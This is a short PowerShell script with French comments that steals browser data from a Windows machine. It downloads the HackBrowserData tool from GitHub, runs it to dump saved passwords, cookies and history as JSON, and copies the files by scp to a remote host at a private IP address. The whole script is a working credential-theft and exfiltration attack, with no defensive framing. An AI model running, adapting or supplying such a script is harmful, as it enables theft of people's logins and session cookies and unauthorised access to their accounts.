# Variables
$serverUser = "DELL"
$serverIP = "192.168.0.117"  # Remplace par l'IP du premier PC
$destDir = "/home/$serverUser/hackbrowserdata"
$localPath = "$env:USERPROFILE\hackbrowserdata"

# Créer un dossier temporaire
New-Item -ItemType Directory -Path $localPath -Force

# Télécharger HackBrowserData
Write-Output "[+] Téléchargement de HackBrowserData..."
Invoke-WebRequest -Uri "https://github.com/moonD4rk/HackBrowserData/releases/latest/download/hackbrowserdata_windows_amd64.zip" -OutFile "$localPath\hackbrowserdata.zip"

# Extraire l’archive
Write-Output "[+] Extraction..."
Expand-Archive -Path "$localPath\hackbrowserdata.zip" -DestinationPath $localPath -Force

# Exécuter HackBrowserData
Write-Output "[+] Extraction des données..."
Set-Location $localPath
Start-Process -NoNewWindow -FilePath ".\hackbrowserdata.exe" -ArgumentList "-o json" -Wait

# Transférer les fichiers via WinSCP (SCP)
Write-Output "[+] Envoi des fichiers..."
scp "$localPath\*.json" "$serverUser@$serverIP`:`$destDir"

Write-Output "[+] Terminé ! Les fichiers sont sur $serverIP`:`$destDir"
